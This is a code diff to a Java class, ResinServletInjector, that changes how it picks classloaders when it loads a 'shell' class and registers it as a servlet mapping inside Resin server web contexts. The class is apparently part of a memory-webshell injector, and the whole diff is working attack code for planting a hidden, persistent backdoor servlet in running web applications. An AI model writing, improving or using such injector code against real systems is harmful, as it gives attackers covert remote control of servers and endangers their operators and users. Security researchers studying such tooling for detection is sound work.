@@ -57,12 +57,17 @@ public class ResinServletInjector {
         return Arrays.asList(contexts.toArray());
     }
 
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "_classLoader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -79,12 +84,7 @@ public class ResinServletInjector {
             System.out.println("servlet already injected");
             return;
         }
-        Class<?> servletMappingClass;
-        try {
-            servletMappingClass = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletMapping");
-        } catch (Exception e) {
-            servletMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.ServletMapping");
-        }
+        Class<?> servletMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.ServletMapping");
         Object servletMapping = servletMappingClass.newInstance();
         invokeMethod(servletMapping, "setServletName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(servletMapping, "setServletClass", new Class[]{String.class}, new Object[]{getClassName()});
